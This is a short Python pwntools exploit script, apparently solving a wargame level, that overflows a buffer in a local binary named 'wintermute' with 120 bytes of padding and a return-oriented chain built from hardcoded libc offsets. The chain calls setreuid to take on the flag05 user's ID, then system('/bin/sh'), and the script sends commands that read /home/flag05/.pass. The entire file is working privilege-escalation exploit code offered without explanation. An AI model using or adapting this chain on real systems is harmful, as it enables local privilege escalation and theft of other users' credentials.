#!/usr/bin/env python3
from pwn import *

BINARY = "./wintermute"
context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "error"

LIBC = 0x7FFFF7C00000
POP_RDI = LIBC + 0x10C08D
POP_RSI = LIBC + 0x110B7D
SETREUID = LIBC + 0x127370
BIN_SH = LIBC + 0x1CC42F
SYSTEM = LIBC + 0x58750
FLAG05_UID = 1022

chain = flat(
    POP_RDI, FLAG05_UID,
    POP_RSI, FLAG05_UID,
    SETREUID,
    POP_RDI, BIN_SH,
    SYSTEM,
)

payload = b"A" * 120 + chain + b"\n"
assert b"\x0a" not in payload[:-1]

io = process(BINARY)
io.sendafter(b"Query: ", payload)
io.sendline(b"id")
io.sendline(b"cat /home/flag05/.pass")
out = io.recvall(timeout=3).decode(errors="replace")
print(out, flush=True)

if "flag05" in out:
    print("[+] flag05, password printed above", flush=True)
else:
    print("[-] failed, see output above", flush=True)
